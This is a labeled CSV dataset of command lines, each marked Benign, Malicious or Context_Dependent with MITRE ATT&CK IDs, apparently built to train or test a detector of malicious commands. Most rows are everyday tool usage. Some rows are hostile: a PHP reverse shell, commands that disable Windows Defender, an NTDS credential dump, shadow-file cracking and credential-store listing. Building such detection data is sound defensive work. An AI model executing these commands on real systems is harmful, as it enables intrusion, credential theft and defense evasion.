command,label,original_label,mitre_id
dnf changelog --count number package,Benign,Benign,Benign
chpass -s path/to/shell,Benign,Benign,Benign
find . \( -name '*.bak' -o -name *.backup \) -type f -atime +30 -exec rm '{}' ';',Benign,Benign,Benign
sshd,Benign,Benign,Benign
dig internal.corp ANY,Context_Dependent,Synthetic,Synthetic
find . -name __temp__* -exec rm -rf '{}' \;,Benign,Benign,Benign
kwriteconfig5 --group group_name --key key --delete,Benign,Benign,Benign
pkl eval module.pkl,Benign,Benign,Benign
shfmt [-i|--indent] 4 path/to/file,Benign,Benign,Benign
Set-AzureADUserPassword -ObjectId $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue,Malicious,Malicious,T1098
"date -d ""Oct 21 1973"" +%s",Benign,Benign,Benign
openscad -o path/to/button.png --colorscheme Sunset path/to/button.scad,Benign,Benign,Benign
udiskie-mount /dev/sdX1,Benign,Benign,Benign
strings path/to/file,Benign,Benign,Benign
find ./ | grep -E 'foo|bar',Benign,Benign,Benign
ls -la ~/Library/Application\ Support/MobileSync/Backup/,Context_Dependent,Malicious,T1083
atoum [-d|--directories] path/to/directory,Benign,Benign,Benign
img2pdf path/to/file.gif --first-frame-only --output path/to/file.pdf,Benign,Benign,Benign
seq 1 10000 | head -1,Benign,Benign,Benign
"setfile -d ""MM/DD/YYYY HH:MM:SS"" path/to/file1 path/to/file2 ...",Benign,Benign,Benign
date,Context_Dependent,Synthetic,Synthetic
kubectx name,Benign,Benign,Benign
"find /nas/projects/mgmt/scripts/perl -mtime 8 -mtime -10 -daystart -iname ""*.pl""",Benign,Benign,Benign
csshX cluster1,Benign,Benign,Benign
javadoc -docencoding UTF-8 path/to/java_source_code,Benign,Benign,Benign
singularity exec image.sif command,Benign,Benign,Benign
pipwin uninstall package,Benign,Benign,Benign
pmset -g batt,Benign,Benign,Benign
tail -20 /etc/exports,Context_Dependent,Synthetic,Synthetic
gladtex path/to/input.htex,Benign,Benign,Benign
dpkg-deb [-x|--extract] path/to/file.deb path/to/directory,Benign,Benign,Benign
"echo ""password"" | argon2 ""salt_text"" -d|i|id",Benign,Benign,Benign
psysh [-c|--config] path/to/file,Benign,Benign,Benign
"lp -P 1,3-5,16 path/to/file",Benign,Benign,Benign
toybox --version,Benign,Benign,Benign
"find ""$topdir"" -name '*.py' -printf '%h\0' | xargs -0 -I {} find {} -mindepth 1 -maxdepth 1 -name Makefile -printf '%h\n' | sort -u",Benign,Benign,Benign
"date -j -f ""%a %b %d %H:%M:%S %Y %z"" ""Sat Aug 09 13:37:14 2014 +1100""",Benign,Benign,Benign
cat `/gnuwin32/bin/find.exe . -name *.php` | wc -l,Benign,Benign,Benign
xmodmap path/to/file,Benign,Benign,Benign
picom-trans [-n|--name] Firefox [-o|--opacity] percentage,Benign,Benign,Benign
osage -T png -O path/to/input.gv,Benign,Benign,Benign
sudo defaults read /Library/Preferences/com.apple.alf,Context_Dependent,Malicious,T1016
pnmtopclxl path/to/input1.pnm path/to/input2.pnm ... > path/to/output.pclxl,Benign,Benign,Benign
openssl genrsa -aes256,Benign,Benign,Benign
dvc init --no-scm,Benign,Benign,Benign
sudo mkfs.btrfs /dev/sdXY,Benign,Benign,Benign
"echo ""1234567890"" > ""$file_to_manipulate""",Malicious,Malicious,T1070
az acr repository delete [-n|--name] registry_name --repository image_name:tag,Benign,Benign,Benign
"tgpt --provider openai|opengpts|koboldai|phind|llama2|blackboxai [-q|--quiet] [-w|--whole] ""prompt""",Benign,Benign,Benign
mole,Benign,Benign,Benign
find . -size -10k,Benign,Benign,Benign
find . -size +100k -a -size -500k,Benign,Benign,Benign
ps -ef | grep $0 | grep $(whoami),Context_Dependent,Benign,Benign
ssh -R 4444:localhost:22 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
gitmoji --search keyword1 keyword2,Benign,Benign,Benign
fcrackzip [-b|--brute-force] [-l|--length] 5 [-c|--charset] 1 [-p|--init-password] 12345 archive,Benign,Benign,Benign
xsv stats path/to/file.csv | xsv table,Benign,Benign,Benign
git scp remote_name path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"find . -type f -name ""*html"" -exec perl -pi -e 's|pibeta.psi.ch/~stefan|midas.psi.ch/~stefan|g' {} ;",Benign,Benign,Benign
siege [-f|--file] path/to/url_list.txt,Benign,Benign,Benign
pmap pid,Benign,Benign,Benign
warp-cli disconnect,Benign,Benign,Benign
pactree,Benign,Benign,Benign
monop -r:path/to/assembly.exe,Benign,Benign,Benign
basename $0,Benign,Benign,Benign
ffplay path/to/file,Benign,Benign,Benign
sysbench --threads=number_of_threads --time=seconds,Benign,Benign,Benign
az redis create --location location [-n|--name] name [-g|--resource-group] resource_group --sku Basic|Premium|Standard --vm-size c0|c1|c2|c3|c4|c5|c6|p1|p2|p3|p4|p5,Benign,Benign,Benign
"eventcreate /so source_name /t type /id id /d ""message""",Benign,Benign,Benign
whatwaf --ra --throttle seconds --timeout seconds [-P|--post] --force-ssl [-u|--url] http://example.com,Benign,Benign,Benign
"smbcacls //server/share path/to/file --user domain\\username%password ""ACL:DACL""",Benign,Benign,Benign
stl2gts --help,Benign,Benign,Benign
lprm -,Benign,Benign,Benign
find . -type f -exec wc -l {} \; | awk '{total += $1} END{print total}',Benign,Benign,Benign
exercism open path/to/directory,Benign,Benign,Benign
brightnessctl [s|set] 10%-,Benign,Benign,Benign
brew search keyword,Benign,Benign,Benign
bat path/to/file1 path/to/file2 ...,Benign,Benign,Benign
setsid program,Benign,Benign,Benign
rsync -a --include='*/' --exclude='*' source/ destination/,Benign,Benign,Benign
autopkgtest [-B|--no-built-binaries] -- null,Benign,Benign,Benign
az tag add-value [-n|--name] tag_name --value tag_value,Benign,Benign,Benign
devinit.exe run -t msi-install -i {REMOTEURL:.msi},Malicious,Malicious,T1218
ldc2 -h,Benign,Benign,Benign
"grep ""# THIS IS A COMMENT"" /etc/default/ufw",Malicious,Malicious,T1562
tldr docker container logs,Benign,Benign,Benign
ls -a >> $output_file,Context_Dependent,Malicious,T1083
find . -type f -ctime $FTIME,Benign,Benign,Benign
Projucer --help,Benign,Benign,Benign
web-ext sign --api-key api_key --api-secret api_secret,Benign,Benign,Benign
"find . | grep -E ""(__pycache__|\.pyc|\.pyo$)"" | xargs rm -rf",Benign,Benign,Benign
figlist -d path/to/directory | grep keyword,Benign,Benign,Benign
ipcalc 192.168.0.1/24,Benign,Benign,Benign
deluge [-c|--config] path/to/configuration_file url|magnet|path/to/file,Benign,Benign,Benign
attrib /d,Benign,Benign,Benign
massdns [-r|--resolvers] path/to/resolvers.txt [-o|--output] S path/to/domains.txt,Benign,Benign,Benign
urpmf --summary keyword1 -a keyword2,Benign,Benign,Benign
ippfind --txt-pdl application/postscript [-h|--host] regex [-x|--exec] ipptool -f onepage-letter.ps '{}' print-job.test \;,Benign,Benign,Benign
Get-Content -Path path\to\file,Benign,Benign,Benign
ansiweather -w true -h true,Benign,Benign,Benign
umount -a,Benign,Benign,Benign
"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done",Context_Dependent,Malicious,T1619
dvc fetch [-A|--all-commits],Benign,Benign,Benign
sudo unshadow /etc/passwd /etc/shadow,Benign,Benign,Benign
pnmrotate [-n|-noantialias] angle path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
sudo dnf [up|upgrade],Benign,Benign,Benign
date +%V,Benign,Benign,Benign
"find . -name ""S1A*1S*SAFE"" | rev | awk -F '/' '{print $1}' | rev | sort -t _ -k 5",Benign,Benign,Benign
raw [-qa|--query --all],Benign,Benign,Benign
kubectl patch secrets secret_name [-p|--patch] $'metadata:\n finalizers: []' --type merge,Benign,Benign,Benign
do_vslist,Context_Dependent,Malicious,T1083
"mount -o ro,remount /dev/stl12 /system",Context_Dependent,Benign,Benign
imhex --hexdump path/to/file,Benign,Benign,Benign
gource [-s|--seconds-per-day] seconds,Benign,Benign,Benign
glab [co|mr checkout] mr_number,Benign,Benign,Benign
wget --version,Benign,Benign,Benign
EnumFontsW(),Malicious,Malicious,T1106
protoc < message.bin --decode=TypeName input_file.proto,Benign,Benign,Benign
e2image /dev/sdXN path/to/image_file,Benign,Benign,Benign
zig build,Benign,Benign,Benign
hledger print assets:cash | hledger [-f|--file] - [-I|--ignore-assertions] aregister expenses:food,Benign,Benign,Benign
ln -s /bin/sh git-x,Malicious,Malicious,T1059
cmake path/to/project_directory,Benign,Benign,Benign
git mailinfo -k message|patch,Benign,Benign,Benign
timidity path/to/file.mid,Benign,Benign,Benign
paste <(cal 2 2009) <(cal 3 2009) <(cal 4 2009),Benign,Benign,Benign
nix store delete /nix/store/checksum-package-version.ext,Benign,Benign,Benign
jdupes [-d|--delete] [-r|--recurse] path/to/directory,Benign,Benign,Benign
"esearch -db pubmed -query ""selective serotonin reuptake inhibitor""",Benign,Benign,Benign
while :; do command; sleep 1; done,Benign,Benign,Benign
ppmtv dim_factor path/to/file.ppm > path/to/output.ppm,Benign,Benign,Benign
"echo ""Summarize the history of Rome"" | gemini [-p|--prompt] -",Benign,Benign,Benign
"DIR=$(dirname ""$(readlink -f \""$0\"")"")",Benign,Benign,Benign
calligrastage,Benign,Benign,Benign
incus start|stop container_name,Benign,Benign,Benign
"rundll32.exe $dll_file,krnl",Malicious,Malicious,T1218
net use c: $share_name,Malicious,Malicious,T1070
mr [-j|--jobs] 5 update,Benign,Benign,Benign
lure [in|install] package,Benign,Benign,Benign
ip [r|route] [l|list] [s|scope] link,Benign,Benign,Benign
asnmap [-a|-asn] AS394161 [-c|-csv] -silent,Benign,Benign,Benign
netperf address -4|6,Benign,Benign,Benign
deemix --bitrate bitrate --path path url,Benign,Benign,Benign
aws quicksight list-users --aws-account-id aws_account_id --namespace default,Benign,Benign,Benign
mesg y,Benign,Benign,Benign
"%TEMP%\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run",Malicious,Malicious,T1134
evince [-f|--fullscreen] path/to/file.pdf,Benign,Benign,Benign
gdrive download id,Benign,Benign,Benign
7za x path/to/archive.7z,Benign,Benign,Benign
pkgdiff -a path/to/package1.txz path/to/package2.txz,Benign,Benign,Benign
"find . -type f -name ""*cache.html"" -exec sh -c ""gzip < {} > {}.gz"" \;",Benign,Benign,Benign
jj git push [-r|--revisions] revset,Benign,Benign,Benign
pr_set_mm_exe_file,Malicious,Malicious,T1036
rm foo,Benign,Benign,Benign
svchost.exe,Malicious,Malicious,T1036
equery depgraph package,Benign,Benign,Benign
jar cf file.jar *,Benign,Benign,Benign
net.exe users,Context_Dependent,Malicious,T1087
standard-version --dry-run,Benign,Benign,Benign
time command,Benign,Benign,Benign
gunicorn --threads 4 import.path:app_object,Benign,Benign,Benign
virsh undefine domain --remove-all-storage --snapshots-metadata,Benign,Benign,Benign
aurman --remove --recursive --nosave package,Benign,Benign,Benign
"sed -i ""s#\(export\ PATH=\""\)\(.*\)#\1/home/$(whoami)/bin:~/\.local/bin:\2#"" ~/.zshrc",Benign,Benign,Benign
pdftoppm -gray path/to/file.pdf image_name_prefix,Benign,Benign,Benign
grep -ri 'credential' /etc/ 2>/dev/null,Context_Dependent,Synthetic,Synthetic
show partitions table_name;,Benign,Benign,Benign
kill -l,Benign,Benign,Benign
"csvsort [-c|--columns] 2,4 data.csv",Benign,Benign,Benign
pkgmk -d -i,Benign,Benign,Benign
kubectl scale --replicas replicas_count [-f|--filename] path/to/file.yml,Benign,Benign,Benign
find . -size 2000k,Benign,Benign,Benign
mytop [-u|-user] user -prompt,Benign,Benign,Benign
find . |xargs grep abc | sed 's/abc/xyz/g',Benign,Benign,Benign
flatpak remove --unused,Benign,Benign,Benign
p5 new collection_name,Benign,Benign,Benign
"exiftool ""-gps*="" path/to/image1 path/to/image2 ...",Benign,Benign,Benign
omz update,Benign,Benign,Benign
hyprctl hyprsunset temperature temperature,Benign,Benign,Benign
doctl [k|kubernetes] [c|cluster] [c|create] --count 3 --region nyc1 --size s-1vcpu-2gb --version latest cluster_name,Benign,Benign,Benign
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon,Malicious,Malicious,T1027
{12d61a41-4b74-7610-a4d8-3028d2f56395},Malicious,Malicious,T1480
eget zyedidia/micro [-t|--tag] v2.0.10,Benign,Benign,Benign
objdump [-d|--disassemble] path/to/binary --visualize-jumps=color|extended-color --disassembler-color=color|extended-color,Benign,Benign,Benign
vlc --loop path/to/file,Benign,Benign,Benign
"split -l ${2:-10000} -d -a 6 ""$1"" ""${tdir}/x""",Benign,Benign,Benign
New-AzAutomationRunbook -Name $runbook_name -Type PowerShell -ResourceGroupName $resource_group -Description 'my-test-runbook' -AutomationAccountName $automation_account_name,Malicious,Malicious,T1078
sudo vgs [-a|--all],Benign,Benign,Benign
httpflow -i any,Benign,Benign,Benign
pw-profiler [-r|--remote] remote_name,Benign,Benign,Benign
wafw00f [-t|--test] Cloudflare|Cloudfront|Fastly|ZScaler|... https://www.example.com,Benign,Benign,Benign
aws rds reboot-db-instance --db-instance-identifier instance_identifier,Benign,Benign,Benign
"shortcuts run ""Count holidays""",Benign,Benign,Benign
nicotine [-r|--rescan],Benign,Benign,Benign
ifdata -e eth0,Benign,Benign,Benign
sequelize seed:generate --name seed_filename,Benign,Benign,Benign
neo [-c|--color] green --colormode 256,Benign,Benign,Benign
spotify_player [-t|--theme] theme_name,Benign,Benign,Benign
npm repo --workspace workspace_name,Benign,Benign,Benign
kaggle [c|competitions] download competition_name,Benign,Benign,Benign
flatpak-builder --gpg-sign key_id --repo repository_name path/to/manifest,Benign,Benign,Benign
bq cp dataset.OLD_TABLE dataset.new_table,Benign,Benign,Benign
"find / -name ""*.txt"" -fstype vfat 2> /dev/null",Context_Dependent,Benign,Benign
x tping [-m|--heatmap] host,Benign,Benign,Benign
"echo -e ""red\ngreen\nblue"" | dmenu > color.txt",Benign,Benign,Benign
DYLD_LIBRARY_PATH,Malicious,Malicious,T1574
license ls,Benign,Benign,Benign
sudo arptables-save > path/to/file,Benign,Benign,Benign
git magic -a,Benign,Benign,Benign
fdroid lint --format app_id,Benign,Benign,Benign
sudo qm [resu|resume] vm_id --skiplock true,Benign,Benign,Benign
verilator --binary --build-jobs 0 -Wall path/to/source.v,Benign,Benign,Benign
git cat-file -t 8c442dc3,Benign,Benign,Benign
find ~/ -name 'core*' -exec rm {} \,Benign,Benign,Benign
%Temp%\setup.exe,Malicious,Malicious,T1027
pg_createsubscriber [-d|--database] dbname [-D|--pgdata] path/to/data [-P|--publisher-server] connstr,Benign,Benign,Benign
buzzphrase,Benign,Benign,Benign
unsetopt option_name1 option_name2 ...,Benign,Benign,Benign
jpegtran -crop WxH -outfile path/to/output.jpg path/to/image.jpg,Benign,Benign,Benign
ls -la /proc/1/fd/,Context_Dependent,Synthetic,Synthetic
find /var/www -name logo.gif,Benign,Benign,Benign
svcadm clear service_name,Benign,Benign,Benign
toipe [-n|--num] number_of_words,Benign,Benign,Benign
procs --and 41 zsh,Benign,Benign,Benign
i3lock [-u|--no-unlock-indicator],Benign,Benign,Benign
"ps aux | awk '{print $11}' | grep -x -e ""/.*"" | xargs -I file dirname ""file""",Context_Dependent,Benign,Benign
rvm upgrade current_version new_version,Benign,Benign,Benign
wermgr.exe,Malicious,Malicious,T1055
lastcomm,Benign,Benign,Benign
diff-pdf --output-diff=path/to/diff.pdf path/to/a.pdf path/to/b.pdf,Benign,Benign,Benign
ls -l | head -2 | tail -1,Benign,Benign,Benign
k9s --readonly --cluster cluster_name,Benign,Benign,Benign
fswebcam [-r|--resolution] widthxheight filename,Benign,Benign,Benign
"find . -name ""*.flac"" -exec basename \{\} .flac \;",Benign,Benign,Benign
sudo aureport [-l|--login],Benign,Benign,Benign
edgepaint -color-scheme=accent7 path/to/layout.gv > path/to/output.gv,Benign,Benign,Benign
light-arionum-cli transaction transaction_id,Benign,Benign,Benign
"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",Malicious,Malicious,T1218
rabin2 -l path/to/binary,Benign,Benign,Benign
cargo init path/to/directory,Benign,Benign,Benign
this.pipe(sh.stdin);,Malicious,Malicious,T1059
terminalizer play path/to/recording.gif,Benign,Benign,Benign
"find ""$musicdir"" -type f -print | egrep -i '\.(mp3|aif*|m4p|wav|flac)$'",Benign,Benign,Benign
ls -lR / | tee -a output.file,Benign,Benign,Benign
uncompress -f path/to/file1.Z path/to/file2.Z ...,Benign,Benign,Benign
su - jetty ./runprogram.sh,Benign,Benign,Benign
chsh [-s|--shell] user nologin,Benign,Benign,Benign
"find . -type f -name ""*.php"" -exec grep --with-filename -c ""^use "" {} \; | sort -t "":"" -k 2 -n -r",Benign,Benign,Benign
kubectl config get-clusters|get-contexts|get-users --kubeconfig path/to/kubeconfig.yaml,Benign,Benign,Benign
find . -name \*.c -print0,Benign,Benign,Benign
vacuumdb [-t|--table] table_name database_name,Benign,Benign,Benign
make [-C|--directory] path/to/directory,Benign,Benign,Benign
"find ${FOLDER} -type f ! -name \"".*\"" -mtime -${RETENTION}",Benign,Benign,Benign
stripe logs tail,Benign,Benign,Benign
find $ARCH1 -ls,Benign,Benign,Benign
"ntdsutil ""ac i ntds"" ""ifm"" ""create full $output_folder"" q q",Malicious,Malicious,T1003
pdfgrep [-m|--max-count] 3 [-i|--ignore-case] '^file_name' file.pdf,Benign,Benign,Benign
"fuzzel [-o|--output] ""DP-1""",Benign,Benign,Benign
plenv help command,Benign,Benign,Benign
kiwi-ng -v,Benign,Benign,Benign
tldr sort,Benign,Benign,Benign
pct unmount 100,Benign,Benign,Benign
find /home -type d -name testdir,Context_Dependent,Benign,Benign
echo '$text_to_append' >> /etc/profile,Malicious,Malicious,T1546
git cliff --current,Benign,Benign,Benign
sudo urpme --auto-orphans,Benign,Benign,Benign
ctest --output-on-failure [-R|--tests-regex] '^test_name$',Benign,Benign,Benign
"php -r '$sock=fsockopen(""192.168.1.100"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"")'",Malicious,Synthetic,Synthetic
gcc path/to/source.c -Wall [-o|--output] output_executable,Benign,Benign,Benign
cdb.exe -pd -pn {process_name} .shell {CMD},Malicious,Malicious,T1127
pnmscalefixed [-w|-width] width path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
ngrep -d eth0,Benign,Benign,Benign
tomb forge encrypted_directory.tomb.key,Benign,Benign,Benign
gomi --prune 1d|1w|1m|1y|...,Benign,Benign,Benign
vhs path/to/file.tape,Benign,Benign,Benign
find / -mtime +50 -mtime -100 | head,Context_Dependent,Benign,Benign
textutil -convert rtf -font Times -fontsize 10 path/to/file.txt,Benign,Benign,Benign
uv publish --publish-url https://upload.pypi.org/legacy/,Benign,Benign,Benign
"find . -maxdepth 1 -empty -not -name "".*""",Benign,Benign,Benign
zbarcam --nodisplay,Benign,Benign,Benign
tldr read,Benign,Benign,Benign
find . | grep html$ | xargs grep <string-to-find>,Benign,Benign,Benign
"mdfind ""query""",Benign,Benign,Benign
phpbu --simulate,Benign,Benign,Benign
mtr -4 example.com,Context_Dependent,Benign,Benign
sg_raw [-s|--send] SLEN /dev/sgX SCSI_command,Benign,Benign,Benign
"if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i $interface; fi;",Context_Dependent,Malicious,T1040
diff -y /tmp/test1 /tmp/test2,Benign,Benign,Benign
ListAttachedRolePolicies,Context_Dependent,Malicious,T1069
guile --listen=port_or_socket,Benign,Benign,Benign
axel [-S|--search=]number url,Benign,Benign,Benign
pdfcrop path/to/input_file.pdf --resolution 72 path/to/output_file.pdf,Benign,Benign,Benign
dig TXT +short o-o.myaddr.l.google.com @ns1.google.com,Benign,Benign,Benign
zizmor [-h|--help],Benign,Benign,Benign
find $HOME -mtime 0,Benign,Benign,Benign
rustc /path/to/temp-file -o /path/to/output-file,Malicious,Malicious,T1222
sudo asr restore --source image_file.dmg --target path/to/volume_file --noverify,Benign,Benign,Benign
ipfs repo gc,Benign,Benign,Benign
"if [[ -e path/to/file_or_directory ]]; then echo ""Condition is true""; fi",Benign,Benign,Benign
Move-Item path\to\source path\to\target,Benign,Benign,Benign
mokutil [-N|--list-new],Benign,Benign,Benign
bshell --vnc,Benign,Benign,Benign
jj [--at-op|--at-operation] operation subcommand,Benign,Benign,Benign
gcrane completion bash > /etc/bash_completion.d/gcrane,Benign,Benign,Benign
php -S 0.0.0.0:80,Malicious,Malicious,T1105
fierce --domain target.com,Context_Dependent,Synthetic,Synthetic
jcal,Benign,Benign,Benign
qsub -q queue_name script.sh,Benign,Benign,Benign
podman machine ssh name,Benign,Benign,Benign
"echo ""$command"" > /etc/cron.d/$cron_script_name",Malicious,Malicious,T1053
aspell dicts,Benign,Benign,Benign
"Rename-Item -Path ""path\to\file"" -NewName ""path\to\new_file_name""",Benign,Benign,Benign
tput rev,Benign,Benign,Benign
sftp host,Benign,Benign,Benign
mc alias set local http://localhost:9000 access_key secret_key,Benign,Benign,Benign
d2 [-t|--theme] theme_id path/to/input_file.d2 path/to/output_file.ext,Benign,Benign,Benign
sudo lastb [-p|--present] hh:mm,Benign,Benign,Benign
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\,Malicious,Malicious,T1552
clang-check path/to/file.cpp -ast-dump -ast-dump-filter FunctionName,Benign,Benign,Benign
nettop -m tcp -t loopback,Benign,Benign,Benign
uname [-srv|--kernel-name --kernel-release --kernel-version],Benign,Benign,Benign
lvmdump -d path/to/directory,Benign,Benign,Benign
"let ""x++""",Benign,Benign,Benign
"git magic -em ""custom_commit_message""",Benign,Benign,Benign
find /usr -type l,Benign,Benign,Benign
lastlog --user username,Context_Dependent,Benign,Benign
wondershaper -a adapter_name -d 1024,Benign,Benign,Benign
pathExtension,Malicious,Malicious,T1106
dig stackoverflow.com,Benign,Benign,Benign
packwiz refresh,Benign,Benign,Benign
csv-diff path/to/file1.csv path/to/file2.csv --key column_name,Benign,Benign,Benign
"kosmorro [-p|--position] ""48.7996,2.3511"" [-d|--date] ""2020-06-09""",Benign,Benign,Benign
lzop [-9|--best] path/to/file,Benign,Benign,Benign
pio device list,Benign,Benign,Benign
tldr transmission-create,Benign,Benign,Benign
"cscript ""$vbscript""",Context_Dependent,Malicious,T1082
"foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}",Context_Dependent,Malicious,T1018
berks upload cookbook,Benign,Benign,Benign
sockstat -6 2>/dev/null || true,Context_Dependent,Malicious,T1049
curl https://example.com,Benign,Benign,Benign
cpuid [-r|--raw],Benign,Benign,Benign
yes | tr \\n x | head -c $((1024*1024*1024)) | pv -L $((1024*1024)) | grep n,Benign,Benign,Benign
afinfo --help,Benign,Benign,Benign
ls -ld /tmp /tnt | sed 's/^.*$/<-- & --->/',Benign,Benign,Benign
valet link application_name,Benign,Benign,Benign
a2ping --extra arguments path/to/file,Benign,Benign,Benign
zeroclaw models refresh --provider openrouter,Benign,Benign,Benign
ppmtolj [-g|-gamma] gamma path/to/input.ppm > path/to/output.lj,Benign,Benign,Benign
rsync -aHvz /path/to/sfolder name@remote.server:/path/to/remote/dfolder,Benign,Benign,Benign
ark [-b|--batch] [-o|--destination] path/to/directory path/to/archive,Benign,Benign,Benign
"find . -iname ""*notes*"" | xargs grep -i mysql",Benign,Benign,Benign
duplicity --full-if-older-than 1M s3://bucket_name[/prefix],Benign,Benign,Benign
stressapptest -M memory -v level,Benign,Benign,Benign
find . -exec program {} +,Benign,Benign,Benign
drupal-check path/to/directory,Benign,Benign,Benign
expac [-S|--sync] [-H|--humansize] M '%k\t%n' package1 package2 ...,Benign,Benign,Benign
sudo lsusb -t|less,Benign,Benign,Benign
sudo sealert [-b|--browser],Benign,Benign,Benign
knotc zone-commit zone,Benign,Benign,Benign
reg load key_name path\to\file.hiv,Benign,Benign,Benign
pocount path/to/file.po,Benign,Benign,Benign
scalafmt --config path/to/.scalafmt.conf --test,Benign,Benign,Benign
find / -type f -print0 | xargs -0 grep -liwZ GUI | xargs -0 rm -f,Context_Dependent,Benign,Benign
hledger-web --serve-api --host my.host.name --allow view,Benign,Benign,Benign
lsmem,Benign,Benign,Benign
command | col [-l|--lines] num,Benign,Benign,Benign
pre-commit clean,Benign,Benign,Benign
mkdir .hiddendir,Benign,Benign,Benign
npm doctor permissions,Benign,Benign,Benign
vcvarsall x64_arm64,Benign,Benign,Benign
"find /home/you -iname ""*.mp3"" -atime 10 -type -f",Context_Dependent,Benign,Benign
gh repo [ls|list] owner [-l|--language] language_name,Benign,Benign,Benign
gh project item-add number --owner owner --url issue_or_pr_url,Benign,Benign,Benign
openstack subnet delete subnet_id_or_name,Benign,Benign,Benign
abrt-action-analyze-c -v,Benign,Benign,Benign
imgp [-x|--res] 1366x1000 path/to/directory path/to/file,Benign,Benign,Benign
paste /path/to/input-file,Context_Dependent,Malicious,T1005
fuser [-m|--mount] path/to/file_or_directory,Benign,Benign,Benign
git branch [-d|--delete] branch_name,Benign,Benign,Benign
tee /tmp/arjhaiX4,Benign,Benign,Benign
e2undo -h path/to/undo_file /dev/sdXN,Benign,Benign,Benign
"find -type f -printf '""%p""",Benign,Benign,Benign
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null,Malicious,Malicious,T1137
"dirsearch [-u|--url] url --extensions-list [-w|--wordlists] path/to/url-paths1.txt,path/to/url-paths2.txt,...",Benign,Benign,Benign
git changelog CHANGELOG.md,Benign,Benign,Benign
set variable value,Benign,Benign,Benign
find . -regex '.*\.\(cpp\|h\)',Benign,Benign,Benign
func new,Benign,Benign,Benign
"elasticsearch-create-enrollment-token [-s|--scope] kibana --url ""IP""",Benign,Benign,Benign
stdbuf [-o|--output] L command,Benign,Benign,Benign
feh [-D|--slideshow-delay] seconds path/to/images,Benign,Benign,Benign
blight dec number,Benign,Benign,Benign
"comby 'assert_eq!(:[a], :[b])' 'assert_eq!(:[b], :[a])' .rs",Benign,Benign,Benign
systemd-escape --template template text,Benign,Benign,Benign
ipython locate profile,Benign,Benign,Benign
qemu-system-i386 -hda image_name.img -m 4096 -cdrom os_image.iso -boot d,Benign,Benign,Benign
"echo $machine >> ""$completed_list""",Malicious,Malicious,T1105
gron --no-sort path/to/file|url,Benign,Benign,Benign
openssl genrsa,Benign,Benign,Benign
sudo nft delete rule inet filter input handle 3,Benign,Benign,Benign
find . \( -name '*.txt' -mtime +5 -o -name '*.html' \) -print0,Benign,Benign,Benign
find . -name test -type d -exec rm -r {} +,Benign,Benign,Benign
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 1",Malicious,Malicious,T1562
command | sed -n '1p',Benign,Benign,Benign
screen -r session_name,Benign,Benign,Benign
find . -iname *.js -type f -exec sed 's/^\xEF\xBB\xBF//' -i.bak {} \; -exec rm {}.bak \;,Benign,Benign,Benign
conda activate --stack myenv,Benign,Benign,Benign
cat /etc/*release | uniq,Context_Dependent,Malicious,T1082
find Symfony -type f,Benign,Benign,Benign
codespell [-w|--write-changes],Benign,Benign,Benign
"find . -type d -name ""mydir"" -exec touch '{}/abc.txt' \;",Benign,Benign,Benign
find . -size +1000k -name *.log -print0 | xargs -0 ls –lSh,Benign,Benign,Benign
ng config projects.project_name.prefix value,Benign,Benign,Benign
sudo nft add chain inet filter input \{ type filter hook input priority 0 \; policy accept \; \},Benign,Benign,Benign
pct [ex|exec] 100 command,Benign,Benign,Benign
tldr http,Benign,Benign,Benign
ntpdate -a x -k /path/to/input-file -d localhost,Context_Dependent,Malicious,T1005
